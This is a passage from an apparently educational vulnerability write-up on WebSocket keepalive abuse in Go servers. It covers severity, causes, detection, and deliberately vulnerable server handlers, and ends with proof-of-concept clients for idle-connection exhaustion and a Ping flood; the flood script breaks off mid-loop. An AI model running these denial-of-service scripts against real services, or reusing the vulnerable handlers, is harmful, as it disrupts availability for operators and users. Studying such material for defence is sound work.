# **WebSocket Keepalive Abuse (ws-keepalive-abuse) in Golang Applications**

## **Severity Rating**

High🟠

The vulnerability known as WebSocket Keepalive Abuse (ws-keepalive-abuse) is rated as **High🟠** severity. This rating is primarily due to the significant potential for Denial of Service (DoS), which directly impacts system and service availability. The Common Vulnerability Scoring System (CVSS) scores for DoS vulnerabilities, particularly those affecting network services like WebSockets, often fall into the high range. For instance, a tRPC WebSocket server vulnerability leading to a crash due to unhandled errors (a form of DoS) was assigned a CVSS 4.0 base score of 8.7 (High), and another unauthenticated WebSocket vulnerability allowing CRUD operations and event subscription with admin privileges (which could be leveraged for DoS or other impacts) received a CVSS score of 7.5 (High).

The factors contributing to this high severity include the relative ease with which basic keepalive abuse attacks, such as Ping floods or resource exhaustion through idle connections, can be scripted and executed (low attack complexity). Furthermore, WebSocket connections are often established prior to full application-level authentication, making the initial protocol interactions, including keepalive mechanisms, accessible to unauthenticated attackers. The impact is almost invariably high availability loss, potentially rendering the WebSocket service or the entire application unavailable to legitimate users.

While the direct technical impact is on availability, prolonged or repeated DoS attacks can lead to significant business impacts, including financial losses from downtime and damage to the service's reputation. The accessibility of WebSocket endpoints over the network to any potential attacker further elevates the risk.

A representative CVSS 3.1 vector for a typical WebSocket Keepalive Abuse scenario leading to DoS could be: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H.`

| **Metric** | **Value Choice** | **Justification** |
| --- | --- | --- |
| Attack Vector (AV) | Network (N) | The vulnerability is exploitable over the network, as WebSockets are a network protocol. |
| Attack Complexity (AC) | Low (L) | Basic forms of keepalive abuse, such as Ping floods or holding connections open without responding to server keepalives, can be implemented with relative ease using simple scripts. |
| Privileges Required (PR) | None (N) | WebSocket connections are typically established before application-level authentication. Abusing Ping/Pong frames or idle connection handling often requires no prior privileges. |
| User Interaction (UI) | None (N) | This is a server-side vulnerability exploited by a remote attacker; no interaction from a legitimate user is required. |
| Scope (S) | Unchanged (U) | The attack typically impacts the availability of the WebSocket server itself and does not usually lead to a compromise that allows the attacker to impact other components or systems. |
| Confidentiality Impact (C) | None (N) | The primary goal and impact of this vulnerability is Denial of Service, not data disclosure. |
| Integrity Impact (I) | None (N) | The primary goal and impact is Denial of Service, not data modification. |
| Availability Impact (A) | High (H) | Successful exploitation can render the WebSocket service or the entire application unavailable to legitimate users. |
| **Overall CVSS 3.1 Score** | **7.5 (High)** | Based on the vector AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |

This standardized scoring underscores the critical nature of addressing WebSocket keepalive mechanisms correctly.

## **Description**

WebSocket Keepalive Abuse refers to a class of vulnerabilities where a client, whether intentionally malicious or unintentionally misbehaving, exploits a WebSocket server's handling of its keepalive mechanisms. In Golang applications, this typically involves the server's management of WebSocket Ping/Pong control frames (as defined by RFC 6455) or its strategy for handling idle connections.

The core issue arises when the server fails to robustly manage the lifecycle and resource consumption associated with potentially very large numbers of long-lived WebSocket connections. This abuse commonly leads to excessive consumption of server resources—such as CPU cycles, memory, available goroutines, and file descriptors—ultimately resulting in degraded performance, instability, or a complete Denial of Service (DoS) for legitimate users.

Such vulnerabilities often stem from missing, incomplete, or improperly configured server-side keepalive logic. This can include the absence of server-initiated Ping messages to check client liveness, failure to set and enforce timeouts for receiving Pong responses, or a lack of rate limiting for incoming control frames or new connection attempts. The vulnerability is not limited to active attacks like Ping floods; it also encompasses passive abuse where unresponsive clients hold server resources indefinitely if the server does not proactively manage connection state and timeouts. This highlights a broader challenge in stateful, long-lived protocols: effective resource lifecycle management in the face of unpredictable or hostile client behavior.

## **Technical Description (for security pros)**

WebSocket Keepalive Abuse vulnerabilities in Golang servers exploit the mechanisms designed to maintain long-lived connections, primarily the Ping/Pong control frames defined in RFC 6455, or the server's handling of idle connections lacking such explicit keepalive traffic.

WebSocket Protocol Keepalive: Ping/Pong Frames (RFC 6455)

The WebSocket protocol specifies control frames to manage the connection state. Among these are Ping and Pong frames 12:

- **Ping Frame (Opcode 0x9)**: A Ping frame can be sent by either endpoint to check if the connection is still alive or to measure round-trip time. It MAY include "Application data" as its payload.
    
- **Pong Frame (Opcode 0xA)**: A Pong frame is typically sent in response to a Ping frame. It MUST carry the identical "Application data" payload as the Ping frame it is responding to. Pong frames can also be sent unsolicited as a unidirectional heartbeat.
    
- **Characteristics**: Control frames, including Ping and Pong, MUST have a payload length of 125 bytes or less and MUST NOT be fragmented.
    
- **Expected Behavior**: Upon receiving a Ping frame, an endpoint MUST send a Pong frame in response, unless it has already sent a Close frame. This response should be sent as soon as practical. This mechanism helps prevent intermediate proxies or firewalls from closing connections they perceive as idle.


Mechanisms of Keepalive Abuse

The abuse of these mechanisms can lead to server resource exhaustion:

1. **Ping Flood**: An attacker establishes one or more WebSocket connections and sends a high frequency of Ping frames to the server. Each Ping frame requires processing by the server: parsing the frame, potentially invoking a Ping handler, and typically generating and sending a Pong frame in response. Even if individual Ping processing is lightweight, a high volume can overwhelm the server's CPU, consume network bandwidth, and exhaust resources allocated for frame handling, leading to a DoS condition. The server's CPU cycles become disproportionately consumed by processing these control frames, starving legitimate application requests and other essential server operations.
    
2. **Pong Starvation / Silent Client**: A server might implement its own keepalive by sending Ping frames to clients and expecting Pong responses within a certain timeout. If a malicious or misbehaving client connects but does not send Pong frames in response (or sends them too slowly), and the server does not correctly implement or enforce a timeout for these Pong responses, the connection may be kept alive indefinitely on the server side. Each such "zombie" connection continues to consume server resources (memory, file descriptors, goroutines) without performing useful work.
    
3. **Resource Holding via Idle Connections (No WebSocket-Level Keepalive)**: If neither the client nor the server actively sends WebSocket Ping frames, the connection might appear idle at the WebSocket layer. While TCP keepalives might exist at the transport layer, they are often configured with very long default timeouts (e.g., 2 hours) or might be disabled. Intermediate network devices (proxies, load balancers, firewalls) often have much shorter idle TCP connection timeouts (e.g., 30-120 seconds) and may close such connections prematurely if no traffic is seen. If the server also doesn't implement its own shorter timeout for general inactivity on the WebSocket connection, it might not promptly detect that a client has disappeared without a proper WebSocket Close handshake, leading to resource leakage.
    

Resource Exhaustion Vectors in Golang Servers

The abuse of keepalive mechanisms translates to specific resource exhaustion problems in Golang WebSocket server implementations:

- **Goroutine Leakage**: It is a common pattern in Golang to handle each WebSocket connection with one or more dedicated goroutines (e.g., a "read pump" and a "write pump"). If connections are not properly terminated due to keepalive failures (e.g., client disconnects silently, server doesn't detect via Ping/Pong timeout), these goroutines can persist indefinitely. A large number of leaked goroutines consume memory (for their stacks) and place an increasing burden on the Go scheduler, degrading overall application performance.

    
- **CPU Exhaustion**: High-frequency Ping frame processing directly consumes CPU cycles. Additionally, managing a large number of connections, each potentially requiring periodic keepalive checks (even if legitimate), can contribute to sustained high CPU usage, especially if the checking logic itself is inefficient.
    
- **Memory Exhaustion**: Each active WebSocket connection typically requires memory for read/write buffers, connection state objects, and the stacks of any associated goroutines. If keepalive issues lead to an accumulation of dead or idle connections that are not reaped, server memory can be exhausted, potentially leading to an Out-Of-Memory (OOM) kill by the operating system.
    
- **File Descriptor (FD) Exhaustion**: Each network connection, including WebSockets, consumes a file descriptor on the server. Operating systems have limits on the number of open file descriptors a process can have. An accumulation of unterminated WebSocket connections due to keepalive failures can exhaust these FDs, preventing the server from accepting new legitimate connections (WebSocket or even standard HTTP).

- **Channel Blocking and Cascading Failures**: If goroutines associated with WebSocket connections use channels for communication (e.g., to receive messages to be sent to the client) and these goroutines become blocked (e.g., a write pump goroutine is stuck trying to write to a client that is no longer responding, and no write timeout is set), then attempts to send data to these channels from other parts of the application can also block. This can lead to a cascading failure where more and more goroutines become blocked, eventually grinding the application to a halt.


The interaction with network intermediaries is also a crucial factor. Many proxies and load balancers enforce their own idle timeouts. If a Golang WebSocket server does not implement its own robust WebSocket-level keepalive mechanism (sending Pings frequently enough to satisfy these intermediaries), legitimate connections might be terminated prematurely. This forces the server to implement such keepalives, which, if not secured against abuse, become the vulnerability. Some WebSocket libraries might provide default Ping/Pong handlers that satisfy the basic RFC requirements (e.g., `gorilla/websocket`'s default Ping handler sends a Pong ), but these defaults often lack the critical timeout enforcement, rate-limiting, and comprehensive resource management logic necessary to defend against keepalive abuse. Developers might erroneously assume that such default behaviors equate to secure handling.

## **Common Mistakes That Cause This**

Several common mistakes in the design and implementation of Golang WebSocket servers can lead to WebSocket Keepalive Abuse vulnerabilities:

1. **Absent or Flawed Server-Initiated Ping/Pong Logic**:
    - **Not Sending Pings**: The server does not periodically send Ping frames to the client to verify its liveness. This means the server has no proactive way to detect if a client has become unresponsive or disconnected silently.
    - **Incorrect Pong Handling**: Even if the server sends Pings, it may fail to correctly handle the expected Pong responses. This includes not setting a timeout within which a Pong must be received, or having a Pong handler that doesn't properly reset a connection activity timer or deadline.
        
    - **Over-reliance on Client Pings**: Relying solely on clients to send Ping frames for keepalive is unreliable, as a misbehaving or malicious client can choose not to send them, leaving the server to hold resources for an idle connection.
2. **Neglecting Connection Deadlines (Read/Write Timeouts)**:
    - **Missing Read Deadlines**: In libraries like `gorilla/websocket`, failing to call `SetReadDeadline()` appropriately when expecting a Pong response or any other message from the client. Without a read deadline, a read operation can block indefinitely on an unresponsive client.
        
    - **No Context Timeouts**: In libraries like `coder/websocket`, not using `context.WithTimeout()` or a similar mechanism to bound the duration of read operations, write operations, or the `Ping()` method itself. This can lead to goroutines blocking indefinitely.
        
    - **Improper Deadline Management**: Setting deadlines that are too long, effectively negating their purpose, or failing to reset them after successful activity (like receiving a Pong or a data message).
3. **Improper Goroutine Management for Client I/O**:
    - **Leaking Goroutines**: Forgetting to ensure that goroutines dedicated to handling a specific client's I/O (read pumps, write pumps) are always terminated when the connection closes or encounters an unrecoverable error. This is a common source of resource leaks if keepalive failures lead to undetected dead connections.

    - **Ignoring Read/Write Errors**: Not properly handling errors returned by read or write operations. These errors (e.g., timeouts, connection reset) are often indicators that the connection is dead and resources should be cleaned up.
4. **Lack of Rate Limiting on Control Frames or Connections**:
    - **No Ping Rate Limiting**: Allowing a single client to send an unlimited number or excessively high frequency of Ping frames. This can lead to CPU exhaustion as the server attempts to process each one.
        
    - **Unrestricted Connection Establishment**: Not limiting the rate at which new WebSocket connections can be established, which can exacerbate resource exhaustion if these new connections are also subject to keepalive abuse.
5. **Ignoring or Mishandling Control Message Processing**:
    - **`gorilla/websocket` Specific**: A common pitfall is not maintaining a persistent read loop that calls `ReadMessage()` or `NextReader()`. These methods are responsible for processing incoming control frames (Pings, Pongs, Close frames). If the read loop terminates prematurely or is not active, the server will not respond to client Pings (the default handler won't send Pongs) and won't process Close frames correctly.
    - **`coder/websocket` Specific**: Failing to use the `Reader()` method or the `CloseRead()` helper function. Similar to Gorilla, these are necessary for handling control frames. Calling `Ping()` without a concurrent reader active will cause `Ping()` to block indefinitely as it waits for a Pong that can't be processed.

6. **Using Unmaintained or Outdated Libraries**:
    - Continuously using libraries like `gorilla/websocket`, which is archived and no longer actively maintained. This means any newly discovered vulnerabilities or missing best practices within the library itself will not be addressed by the original maintainers, increasing long-term risk.
        
7. **Misunderstanding Library Defaults and Responsibilities**:
    - Assuming that the default behavior of a WebSocket library provides sufficient keepalive security without explicit configuration. For example, while `gorilla/websocket`'s default Ping handler sends a Pong, the server application is still responsible for sending its own Pings and managing read deadlines for expected Pongs. The library provides primitives, but the secure keepalive strategy must be implemented by the developer.
        
The subtlety of these issues, particularly concerning the intricacies of read loops and control frame processing in specific libraries, makes them easy to overlook. For instance, a developer using `gorilla/websocket` might focus on data message exchange and neglect the continuous read loop requirement for control frames, leading to unresponsive keepalives and resource leaks. These vulnerabilities often remain hidden during standard functional testing, as they manifest under specific conditions like prolonged client inactivity, network latency, or high connection loads, which are not typically part of basic test suites.

## **Exploitation Goals**

Attackers exploiting WebSocket Keepalive Abuse vulnerabilities primarily aim to achieve the following:

1. **Denial of Service (DoS)**: This is the most common and direct goal. By overwhelming the server with keepalive-related traffic (e.g., Ping floods) or by causing it to maintain resources for a vast number of defunct connections, attackers can exhaust server resources such as CPU, memory, file descriptors, or available goroutines. This leads to the WebSocket server becoming unresponsive to legitimate user requests, or even crashing entirely. The server process might be terminated by the operating system (e.g., via an OOM killer) if memory consumption becomes excessive.
2. **Resource Depletion and Cost Inflation**: Attackers may aim to tie up server resources for extended periods. This not only degrades performance for legitimate users but can also lead to increased operational costs, especially in cloud environments where resources might auto-scale in response to perceived load (which is actually malicious traffic or resource leakage). Sustained resource depletion can make the service unreliable and frustrating for users, potentially damaging the service's reputation.
3. **Connection Pool Exhaustion**: If the WebSocket server itself, or an upstream component like a load balancer or database connection pool it relies on, has a finite limit on concurrent connections, an attacker holding many WebSocket connections open indefinitely (due to flawed keepalive handling) can exhaust these pools. This prevents new legitimate connections from being established, effectively denying service.
4. **Inducing Deadlocks or Exposing Latent Bugs**: While not a direct goal of keepalive *abuse* itself, the instability caused by resource exhaustion or improper connection termination resulting from keepalive failures could potentially trigger latent deadlock bugs or race conditions within the server's application logic. This might occur if shared resources are not managed correctly during the chaotic cleanup of many simultaneously failing connections. However, this is a secondary and less predictable outcome.

The primary motivation is typically disruption. The combination of potentially low technical skill required for basic attacks (e.g., simple Ping floods or connection spamming) and the high impact on service availability makes this an attractive target for attackers seeking to cause service outages or degradation.

## **Affected Components or Files**

The WebSocket Keepalive Abuse vulnerability primarily affects the server-side components of a Golang application responsible for handling WebSocket connections. Specific components include:

1. **Golang WebSocket Server Implementations**: Any Go application that functions as a WebSocket server is potentially vulnerable if it does not correctly implement or configure keepalive handling, timeout mechanisms, and resource management for its WebSocket connections.
2. **Standard Library (`golang.org/x/net/websocket`)**: Applications directly using the `golang.org/x/net/websocket` package are highly susceptible. This package provides basic WebSocket functionality but lacks built-in, advanced keepalive management features. Developers using this library must manually implement robust Ping/Pong logic, connection timeouts, and resource cleanup, which is complex and error-prone.
3. **`gorilla/websocket` Library**: This widely-used library is a common point of vulnerability, especially given its archived and unmaintained status.**23** Specific areas within an application using `gorilla/websocket` that are affected include:
    - The `Upgrader` instance and its configuration.
    - Goroutines responsible for handling individual client connections, particularly the "read pump" and "write pump" patterns.
    - Custom Ping and Pong handlers set via `SetPingHandler()` and `SetPongHandler()`.
    - Code that sets or fails to set read/write deadlines using `SetReadDeadline()` and `SetWriteDeadline()`.
    - The logic ensuring continuous processing of control frames via the read loop.
4. **`coder/websocket` Library (formerly `nhooyr.io/websocket`)**: While actively maintained and offering more modern features like context-based timeouts, applications using this library can still be vulnerable if developers misuse its API. Affected areas include:
    - Code that uses `websocket.Accept()` to establish connections.
    - Goroutines that use `Reader()` or the `CloseRead()` helper for message and control frame processing.
    - The implementation and context management for the `Ping(ctx)` method.
    - Configuration and behavior of `OnPingReceived` and `OnPongReceived` callbacks.
5. **Application-Specific Connection Management Logic**: Any custom code within the application that is responsible for:
    - Tracking active WebSocket connections (e.g., in maps or slices).
    - Managing the lifecycle of connections.
    - Pooling or allocating resources (like buffers or goroutines) for connections.
    - Implementing custom keepalive or timeout strategies.
6. **Operating System / Kernel Resources**: Indirectly, the underlying operating system and kernel are affected. The vulnerability in the Go application can lead to the exhaustion of system-level resources such as:
    - **File descriptors**: Each WebSocket connection consumes a file descriptor.
        
    - **Memory**: Leaked goroutines and connection objects consume system memory.
        
    - **CPU time**: Excessive Ping processing or scheduling overhead from too many goroutines consumes CPU resources.
    The Go runtime's network poller and the OS's TCP/IP stack are integral to WebSocket communication, and their capacity can be overwhelmed if the application layer fails to manage connections properly.
        
7. **Proxies and Load Balancers**: While not directly part of the Golang application, misconfiguration or misunderstanding of how upstream proxies or load balancers handle idle TCP connections can exacerbate or be misdiagnosed as a server-side keepalive issue. If these intermediaries have short idle timeouts, the Golang server *must* implement WebSocket-level keepalives to prevent legitimate connections from being dropped.

In essence, any part of the Golang codebase that instantiates, reads from, writes to, or manages the state of WebSocket connections is a potential locus for this vulnerability if secure keepalive practices are not followed. In microservice architectures, a vulnerable WebSocket service can become a critical point of failure, impacting other services that depend on it for real-time communication or notifications.

## **Vulnerable Code Snippet**

The following Go code snippets illustrate common ways WebSocket Keepalive Abuse vulnerabilities can manifest.

**Scenario 1: `gorilla/websocket` Server with No Keepalive/Timeouts**

This is a common scenario where the server accepts WebSocket connections but implements no server-side keepalive mechanism (no server-initiated Pings, no read deadlines for Pongs or general activity).

```Go

package main

import (
	"log"
	"net/http"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true }, // Simplified for example
}

func handleConnectionsNoKeepalive(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err!= nil {
		log.Printf("upgrade error: %v", err)
		return
	}
	defer ws.Close()

	log.Printf("Client connected: %s", ws.RemoteAddr())

	// PROBLEM: No server-initiated pings are sent.
	// PROBLEM: No read deadline is set on the connection.
	// A client can connect and remain idle indefinitely, consuming server resources.
	// Or, a client can become unresponsive, and the server will not detect this proactively.
	for {
		// This ReadMessage call will block indefinitely if the client sends nothing.
		// If the client disconnects ungracefully (e.g., network drop), this might
		// eventually error out, but only after underlying TCP timeouts, which can be very long.
		// During this blocking, if this is the only mechanism for processing incoming data,
		// control frames (like a client-sent Ping or Close) might not be processed
		// if the library relies on read calls to also process control messages.
		// In Gorilla, ReadMessage() *does* process control frames, but if it's
		// blocked waiting for a data message that never comes, and no deadline is set,
		// the connection effectively hangs from the server's perspective of liveness checking.
		messageType, message, err := ws.ReadMessage()
		if err!= nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("unexpected close error: %v", err)
			} else {
				log.Printf("read error: %v", err)
			}
			break // Exit loop on error
		}
		log.Printf("Received: type=%d, msg=%s", messageType, string(message))

		// Example: Echo message back
		if err := ws.WriteMessage(messageType, message); err!= nil {
			log.Printf("write error: %v", err)
			break
		}
	}
	log.Printf("Client disconnected: %s", ws.RemoteAddr())
}

func main() {
	http.HandleFunc("/ws_nokeepalive", handleConnectionsNoKeepalive)
	log.Println("HTTP server started on :8001")
	err := http.ListenAndServe(":8001", nil)
	if err!= nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
```

Explanation of Vulnerability (Scenario 1):

This server 17 establishes a WebSocket connection and enters a loop to read messages. However:

1. It does not send Ping messages to the client.
2. It does not set any read deadline on the `ws.ReadMessage()` call.
A malicious or misbehaving client can connect and send no data. The `ws.ReadMessage()` call will block indefinitely. The server will keep the connection open, consuming a file descriptor, memory for the connection object and buffers, and the goroutine stack for `handleConnectionsNoKeepalive`. Many such clients can exhaust server resources. If an intermediary (like a load balancer) has an idle timeout, it might close the TCP connection, but the server goroutine might still be blocked on `ReadMessage` until a lower-level TCP error propagates, which can take a long time.

**Scenario 2: `coder/websocket` Server with Improper Control Frame Handling**

This scenario demonstrates a `coder/websocket` server that reads an initial message but then fails to maintain an active read mechanism, preventing proper handling of control frames.

```Go

package main

import (
	"context"
	"log"
	"net/http"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

func handleConnectionsCoderImproper(w http.ResponseWriter, r *http.Request) {
	c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true, // Simplified for example
	})
	if err!= nil {
		log.Println(err)
		return
	}
	// It's crucial to close the connection when done.
	// CloseNow is used here for simplicity; a graceful close with a reason is often better.
	defer c.Close(websocket.StatusInternalError, "connection ended unexpectedly")

	log.Printf("Client connected (coder improper): %s", r.RemoteAddr)

	// Read one message
	ctx, cancel := context.WithTimeout(r.Context(), time.Second*30) // Timeout for the initial read
	defer cancel()

	var v interface{}
	err = wsjson.Read(ctx, c, &v)
	if err!= nil {
		log.Printf("coder improper: read error: %v", err)
		// Connection will be closed by defer.
		return
	}
	log.Printf("coder improper: received initial message: %v", v)

	// PROBLEM: After reading the initial message, this handler does nothing further to read from the connection.
	// According to the coder/websocket documentation, "You must always read from the connection.
	// Otherwise control frames will not be handled." [30, 31]
	// If the server doesn't call c.Reader() or c.CloseRead() after this point,
	// then:
	// 1. If the client sends Ping frames, the server's OnPingReceived callback (if set) won't fire,
	//    and default Pong responses won't be sent.
	// 2. If the server were to call c.Ping() later, it would likely block or error out because
	//    the corresponding Pong from the client wouldn't be read and processed by a concurrent Reader.
	// 3. Client-initiated Close frames might not be promptly processed.
	// The TCP connection might remain open, consuming resources, until a lower-level timeout or error.

	// To demonstrate the problem, let's imagine the server logic wants to keep the connection
	// open for a while for potential future writes, but doesn't read.
	time.Sleep(5 * time.Minute) // Simulate work or just keeping connection open
	log.Printf("coder improper: finished simulated work for %s", r.RemoteAddr)
	c.Close(websocket.StatusNormalClosure, "finished processing")
}

func main() {
	// http.HandleFunc("/ws_nokeepalive", handleConnectionsNoKeepalive) // From Scenario 1

	http.HandleFunc("/ws_coder_improper", handleConnectionsCoderImproper)
	log.Println("HTTP server started on :8001")
	err := http.ListenAndServe(":8001", nil)
	if err!= nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
```

Explanation of Vulnerability (Scenario 2):

The handleConnectionsCoderImproper function accepts a connection and reads a single JSON message. After this, it simulates some work or an idle period (time.Sleep) without further reads from the WebSocket connection. According to coder/websocket documentation, control frames (Pings, Pongs, Close) are only processed when the application is actively trying to read from the connection (e.g., via c.Reader() in a loop) or if c.CloseRead(ctx) is called to handle them in the background.30

By not having an active read mechanism after the initial message:

1. If the client sends Ping frames, the server will not process them, and thus will not send Pong responses (if relying on default behavior or an `OnPingReceived` callback).
2. If the server itself were to later call `c.Ping(ctx)` (not shown in this snippet, but a possibility in a more complex handler), that call would likely block indefinitely or timeout, because there's no active reader goroutine to process the client's Pong response.
3. The client might send a Close frame, but the server wouldn't process it promptly, potentially delaying resource cleanup.
This can lead to connections remaining in a "zombie" state, consuming resources, because the server isn't properly engaging in the keepalive handshake or processing control frames that would lead to a clean termination. The subtlety here is that the initial connection and message exchange might work, but the long-term health and cleanup of the connection are compromised.

These snippets illustrate that the vulnerability is often not about a single missing line of code, but a misunderstanding or incomplete implementation of the stateful, continuous interaction required by the WebSocket protocol and the specific library being used. Such issues can be challenging to identify through basic functional testing, which might not simulate long-lived idle connections or specific sequences of control frame exchanges.

## **Detection Steps**

Detecting WebSocket Keepalive Abuse vulnerabilities requires a combination of static code analysis, dynamic testing, and server monitoring.

1. Static Code Analysis:

Thoroughly review the Golang source code for WebSocket server implementations.

- **Identify WebSocket Libraries**: Determine if the application uses `golang.org/x/net/websocket`, `github.com/gorilla/websocket`, `github.com/coder/websocket`, or another third-party/custom library.
- **For `gorilla/websocket` implementations**:
    - Verify the presence of a continuous read loop (e.g., `for { conn.ReadMessage() }`) in each connection handler. This loop is essential for processing incoming data and control frames.
        
    - Check if `SetReadDeadline()` is called before `ReadMessage()` or `NextReader()` if the server expects a message (including a Pong) within a specific timeframe.
        
    - If server-initiated pings are used, ensure a `SetPongHandler()` is implemented and that it correctly resets the read deadline upon receiving a Pong.

    - Look for proper error handling within the read loop that leads to connection closure and resource cleanup.
- **For `coder/websocket` implementations**:
    - Ensure that `Ping(ctx)` is used with a `context` that has an appropriate timeout.

    - Verify that `Reader(ctx)` is called concurrently with `Ping(ctx)` if the application expects to read data messages, OR that `CloseRead(ctx)` is called if the application only intends to write or use Pings for keepalive without reading data messages. This is crucial for processing Pongs and other control frames.
    
    - Check that contexts passed to read/write operations have timeouts to prevent indefinite blocking.
- **General Checks**:
    - Look for the absence of any rate-limiting mechanisms on new connection establishments or on the frequency of incoming control frames (like Pings).
    - Inspect goroutine lifecycle management: ensure goroutines spawned per connection are guaranteed to exit when the connection is closed or errors out.
    - Check for explicit calls to `conn.Close()` in all paths that should terminate the connection (error, timeout, clean shutdown).

2. Dynamic Analysis / Penetration Testing:

Simulate client behaviors to test the server's response.

- **Idle Connection Test**: Connect a large number of clients that, after the initial handshake, send no data and do not respond to any server-initiated Pings (if the testing tool allows suppressing Pongs). Monitor server resources (goroutines, memory, file descriptors) over time. A steady increase without stabilization indicates a resource leak due to mishandled idle connections.
- **Pong Timeout Test**: If the server sends Pings, connect a client that intentionally does not send Pong responses. Observe if the server correctly times out and closes the connection within the expected interval.
- **Ping Flood Test**: Develop a script or use a specialized tool to send a high volume of Ping frames to the WebSocket server from one or more connections. Monitor server CPU utilization, memory usage, and responsiveness to legitimate clients. A significant degradation in performance or crash indicates vulnerability.

- **Connection Churn Test**: Rapidly open and close a large number of connections. This can sometimes expose issues in resource allocation/deallocation or in connection tracking logic.
- **Network Interception**: Use tools like Wireshark to observe the actual Ping/Pong traffic, their frequency, payloads, and the timing of connection closures. This can help verify if implemented keepalive mechanisms are behaving as expected.

3. Server-Side Monitoring:

Implement and monitor key server metrics.

- **Active WebSocket Connections**: Track the number of currently active WebSocket connections. Unexplained, continuously growing numbers, especially during periods of low legitimate traffic, are a strong indicator of connection leaks.
- **Goroutine Count**: Monitor `runtime.NumGoroutine()`. A persistently increasing goroutine count that doesn't return to a baseline often signals leaked goroutines associated with unclosed connections.
    
- **CPU and Memory Usage**: Track overall CPU and memory utilization of the Go process. Sustained high CPU without proportional traffic, or steadily increasing memory usage (heap size), can point to resource exhaustion from keepalive abuse or leaks.

- **File Descriptor Usage**: On Linux/macOS, monitor the number of open file descriptors for the server process (e.g., using `lsof -p <pid> | wc -l`). Approaching the system or process limit is a critical sign.
- **Application-Level Logs**: Ensure detailed logging for connection establishment, errors (especially read/write timeouts), keepalive events (Pings sent, Pongs received), and connection closures. These logs are invaluable for diagnosing issues.

**4. Infrastructure and Configuration Checks:**

- **Proxy/Load Balancer Timeouts**: Review the idle timeout settings of any intermediate proxies or load balancers. If these are shorter than the server's keepalive interval (or if the server has no keepalive), legitimate connections might be dropped. This isn't a server vulnerability per se, but a misconfiguration that can mimic one or force the server to implement keepalives that could then be abused.
    

Detecting "passive" abuse, where resources leak due to unresponsive clients and inadequate server timeouts, can be more challenging than detecting "active" abuse like Ping floods. Ping floods often cause immediate and obvious CPU spikes, while resource leaks might be a slower process, only becoming apparent under sustained load or after a prolonged period, potentially when system limits on file descriptors or memory are hit. A common misdiagnosis is to blame network intermediaries for dropped connections when the root cause is the server's failure to send WebSocket-level keepalives, leading the intermediary to correctly close what it perceives as an idle TCP session.

## **Proof of Concept (PoC)**

The following outlines conceptual Proofs of Concept (PoCs) to demonstrate WebSocket Keepalive Abuse. These PoCs generally require custom client implementations, as standard browser WebSocket APIs offer limited control over Ping/Pong frames or the suppression of automatic Pong responses.**11**

PoC 1: Resource Exhaustion via Multiple Idle Connections

This PoC targets servers that do not implement proper timeouts or server-initiated keepalives for idle connections (e.g., the vulnerable gorilla/websocket server in "Vulnerable Code Snippet - Scenario 1").

1. **Setup**:
    - Deploy the vulnerable Golang WebSocket server that lacks keepalive logic and read deadlines.
    - Ensure server resource monitoring is in place (e.g., track goroutine count via `runtime.NumGoroutine()`, memory via `runtime.ReadMemStats`, and open file descriptors via `lsof`).
2. **Client Script (e.g., in Go)**:
    
    ```Go
    
    package main
    
    import (
    	"log"
    	"net/url"
    	"sync"
    	"time"
    	"github.com/gorilla/websocket" // Or any other WebSocket client library
    )
    
    func connectAndIdle(serverURL string, wg *sync.WaitGroup) {
    	defer wg.Done()
    	u, err := url.Parse(serverURL)
    	if err!= nil {
    		log.Printf("Error parsing URL: %v", err)
    		return
    	}
    	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
    	if err!= nil {
    		log.Printf("Dial error: %v", err)
    		return
    	}
    	//defer c.Close() // Deliberately not closing to simulate an abrupt disconnect or idle client
    
    	log.Printf("Connected to %s, now idling.", serverURL)
    	// Keep the connection open without sending or actively receiving data.
    	// The server, if vulnerable, will not detect this client as dead.
    	time.Sleep(10 * time.Minute) // Stay connected for a long time
    	log.Printf("Client for %s finished idling (or was disconnected).", serverURL)
        // In a real scenario, the client might just exit or lose network connectivity
        // without a graceful close. For this PoC, we might let the Sleep finish
        // or manually kill client processes to simulate ungraceful disconnects.
        // For a more aggressive PoC, remove the Sleep and just let the connection hang.
    }
    
    func main() {
    	serverURL := "ws://localhost:8001/ws_nokeepalive" // Target the vulnerable server
    	numConnections := 1000 // Number of concurrent idle connections to create
    
    	var wg sync.WaitGroup
    	for i := 0; i < numConnections; i++ {
    		wg.Add(1)
    		go connectAndIdle(serverURL, &wg)
    		time.Sleep(50 * time.Millisecond) // Stagger connections slightly
    	}
    	wg.Wait()
    	log.Println("All clients finished or timed out.")
    }
    ```
    
3. **Execution**: Run the client script.
4. **Observation**: Monitor the server's goroutine count, memory usage, and file descriptor count.
5. **Expected Result**:
    - The server's resource consumption (goroutines, memory, FDs) will increase with each new connection.
    - These resources will not be reclaimed even if the client script instances are terminated abruptly (simulating network drops), because the server has no mechanism to detect these dead connections.
    - Over time, or with a sufficiently large `numConnections`, the server may become unresponsive or crash due to resource exhaustion.

PoC 2: Ping Flood Attack

This PoC targets servers that process Ping frames but lack rate limiting on them.

1. **Setup**:
    - Deploy a Golang WebSocket server (this could be a correctly implemented one that responds to Pings, or a vulnerable one).
    - Monitor server CPU usage closely.
2. **Client Script (e.g., in Go using `gorilla/websocket`)**:
    
    ```Go
    
    package main
    
    import (
    	"log"
    	"net/url"
    	"time"
    	"github.com/gorilla/websocket"
    )
    
    func floodPings(serverURL string) {
    	u, err := url.Parse(serverURL)
    	if err!= nil {
    		log.Fatalf("Error parsing URL: %v", err)
    	}
    	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
    	if err!= nil {
    		log.Fatalf("Dial error: %v", err)
    	}
    	defer c.Close()
    
    	log.Printf("Connected to %s, starting Ping flood.", serverURL)
    
    	// Set a very short timeout for pongs if the library expects them for ping writes,
    	// or handle errors gracefully if pings are fire-and-forget.
    	// Gorilla's WriteMessage for PingMessage doesn't inherently wait for a Pong.
    	for {
    		err := c.WriteMessage(websocket.PingMessage,byte("flood"))
    		if err!= nil {
